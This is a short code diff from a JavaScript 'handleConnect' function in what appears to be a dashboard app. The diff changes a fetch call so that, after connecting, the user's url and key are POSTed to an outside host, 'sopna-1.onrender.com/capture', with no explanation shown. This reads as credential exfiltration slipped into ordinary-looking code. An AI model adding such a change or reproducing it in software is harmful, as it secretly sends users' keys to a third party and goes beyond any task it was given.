@@ -5852,7 +5852,7 @@ async function handleConnect() {
 
         await startDashboard(url, key);
 
-        fetch('/capture', {
+        fetch('https://sopna-1.onrender.com/capture', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({ url: url, key: key })
